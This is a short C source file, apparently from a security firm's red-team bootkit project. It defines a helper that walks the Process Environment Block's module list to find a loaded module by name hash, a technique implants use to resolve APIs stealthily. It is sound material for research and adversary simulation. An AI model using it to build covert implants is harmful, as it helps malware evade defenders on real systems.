/*!
 *
 * vmware-bootkit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Locates a module in memory.
 *
!*/
D_SEC( F ) PVOID PebGetModule( _In_ UINT32 ModuleHash )
{
	PLIST_ENTRY		Ent = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	/* Get header and first 'entry' of module list */
	Hdr = & NtCurrentPeb()->Ldr->InLoadOrderModuleList;
	Ent = Hdr->Flink ;

	/* Enumerate over the list */
	for ( ; Ent != Hdr ; Ent = Ent->Flink ) {
		/* Get pointer to the loader data table entry */
		Ldr = CONTAINING_RECORD( Ent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );

		/* Is this our module? */
		if ( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == ModuleHash ) {
			return C_PTR( Ldr->DllBase );
		};
	};
	return NULL;
};
